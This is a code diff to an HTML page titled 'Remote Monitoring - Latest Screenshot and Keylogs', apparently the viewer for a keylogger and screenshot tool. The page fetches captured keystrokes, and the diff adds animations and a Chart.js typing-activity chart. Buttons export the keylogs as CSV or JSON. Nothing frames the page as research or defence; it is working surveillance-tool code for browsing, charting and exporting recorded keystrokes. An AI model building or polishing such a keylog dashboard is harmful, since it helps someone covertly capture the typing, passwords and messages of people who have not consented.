@@ -23,6 +23,8 @@
             border: 2px solid #2980b9;
             border-radius: 5px;
             box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+            opacity: 0; /* Start hidden for fade-in */
+            animation: fadeIn 1s forwards; /* Fade-in animation */
         }
         #keylog-content {
             background-color: #fff;
@@ -38,10 +40,29 @@
             font-weight: bold;
             margin-top: 10px;
         }
-        #error-logs {
-            color: red;
-            font-weight: bold;
-            margin-top: 20px;
+        button {
+            padding: 10px 15px;
+            margin: 5px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s, transform 0.2s; /* Button animation */
+        }
+        .toggle-button {
+            background-color: #2980b9;
+            color: white;
+        }
+        .toggle-button:hover {
+            background-color: #1a5b8a;
+            transform: scale(1.05);
+        }
+        .download-button {
+            background-color: #27ae60;
+            color: white;
+        }
+        .download-button:hover {
+            background-color: #1e8b48;
+            transform: scale(1.05);
         }
         .dark-mode {
             background-color: #2c3e50;
@@ -50,22 +71,14 @@
         .dark-mode h1, .dark-mode h2 {
             color: #ecf0f1;
         }
-        button {
-            padding: 10px 15px;
-            margin: 5px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-        .toggle-button {
-            background-color: #2980b9;
-            color: white;
-        }
-        .download-button {
-            background-color: #27ae60;
-            color: white;
+
+        @keyframes fadeIn {
+            to {
+                opacity: 1; /* Fade in to full opacity */
+            }
         }
     </style>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script> <!-- Include Chart.js -->
 </head>
 <body>
     <h1>Remote Monitoring - Latest Screenshot and Keylogs</h1>
@@ -119,6 +132,7 @@
                     .then(data => {
                         document.getElementById('keylog-content').innerText = data;
                         updateTimer();
+                        updateActivityChart(data); // Update the chart with the latest keylog data
                     })
                     .catch(error => logError('Error fetching keylog: ' + error));
             }
@@ -135,6 +149,62 @@
 
             // Timer display
             document.body.insertAdjacentHTML('beforeend', '<div id="timer">Last updated: </div>');
+
+            // Chart for typing activity
+            const ctx = document.createElement('canvas');
+            ctx.id = 'activityChart';
+            document.body.appendChild(ctx);
+            const activityChart = new Chart(ctx, {
+                type: 'line',
+                data: {
+                    labels: [], // Timestamps for x-axis
+                    datasets: [{
+                        label: 'Typing Activity',
+                        data: [], // Data points for y-axis
+                        borderColor: 'rgba(75, 192, 192, 1)',
+                        borderWidth: 2,
+                        fill: false,
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    scales: {
+                        x: {
+                            type: 'time',
+                            time: {
+                                unit: 'minute'
+                            },
+                            title: {
+                                display: true,
+                                text: 'Time'
+                            }
+                        },
+                        y: {
+                            title: {
+                                display: true,
+                                text: 'Key Presses'
+                            }
+                        }
+                    }
+                }
+            });
+
+            // Update activity chart based on keylog data
+            function updateActivityChart(keylogData) {
+                const lines = keylogData.trim().split('\n');
+                const timestamps = [];
+                const counts = [];
+
+                lines.forEach(line => {
+                    const [timestamp, ...keys] = line.split(' ');
+                    timestamps.push(timestamp);
+                    counts.push(keys.length); // Count keys for this timestamp
+                });
+
+                activityChart.data.labels = timestamps;
+                activityChart.data.datasets[0].data = counts;
+                activityChart.update();
+            }
         </script>
     </div>
 
@@ -200,8 +270,5 @@
     <h2>Download Keylogs</h2>
     <button class="download-button" onclick="downloadKeylogCSV()">Download as CSV</button>
     <button class="download-button" onclick="downloadKeylogJSON()">Download as JSON</button>
-
-    <h2>Final Considerations</h2>
-    <p>Enhancing user experience with subtle animations and well-designed buttons can make this monitoring page feel more responsive. Consider using visualizations to represent typing activity trends or to highlight active hours for improved data analysis.</p>
 </body>
 </html>
